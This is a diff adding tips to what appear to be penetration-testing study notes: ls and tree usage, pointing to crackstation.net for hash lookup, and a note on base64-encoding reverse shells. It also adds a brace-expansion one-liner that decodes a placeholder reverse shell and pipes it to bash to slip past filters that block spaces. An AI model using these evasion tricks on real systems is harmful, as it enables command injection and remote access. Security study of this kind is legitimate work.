@@ -321,3 +321,28 @@ This service scans our sample against 30 different AV engines and claims to not 
 
 Be aware of this method of access, it is convinient. 
 
+#### Cool *ls* Commands
+
+```bash
+# Extensive command that is all you could as for, consider making an alias
+ls -lsaht
+# Both of these recursively show you the subdirectories and files within
+tree .
+ls -lsaR
+```
+
+#### Crackstation.net
+
+Instead of manual cracking with hashcat or JTR, you can put the hash into "https://crackstation.net" instead. According to S1REN (OffSec employee), it's akin to running the rockyou.txt wordlist with hashcat & JTR.
+
+#### Note When Encoding Payload
+
+Whenever encoding and decoding a reverse shell in base 64, remove the special characters like + and = because they often cause errors. Simply insert extra spaces where necessary. 
+
+#### No Spaces in Payload Work-Around
+
+```bash
+{echo,-n,**base64 encoded reverse bash shell}|{base64,-d}|bash
+```
+
+This can overcome rules that don’t allow for spaces. 
